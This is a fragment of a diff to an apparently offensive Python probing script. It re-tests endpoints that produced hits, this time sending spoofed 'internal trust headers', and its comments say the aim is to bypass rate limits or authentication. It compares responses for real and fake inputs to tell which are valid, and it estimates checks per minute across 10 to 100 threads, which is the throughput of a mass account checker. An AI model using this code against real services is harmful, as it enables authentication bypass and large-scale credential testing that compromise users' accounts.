+# ─── Re-run top hits with ALL internal header combos ─────────────────────────
+# If any endpoint returned a hit without internal headers, retry with headers
+# to see if the diff changes (internal headers may bypass rate limit / auth)
 print("[*] Re-probing wins with internal trust headers ...")
 for w in list(WINS):
     ep = w.get("ep","")
-    if "INT" in ep: continue
+    if "INT" in ep: continue  # already an internal probe
+    # parse method and url from ep string
     for part in ep.split():
         if part.startswith("http"):
             for hset in INTERNAL_HDRS_SETS:
@@ -1013,6 +1126,7 @@ for w in WINS:
     print(f"  *** {ep}")
     if "rsc" in w:
         print(f"      real {w['rsc']}/{w['rln']}b  fake {w['fsc']}/{w['fln']}b")
+        # CPM estimate: assume 300ms avg round trip, N threads
         avg_ms = 300
         for threads in [10, 30, 50, 100]:
             cpm = int(threads / (avg_ms/1000) * 60)
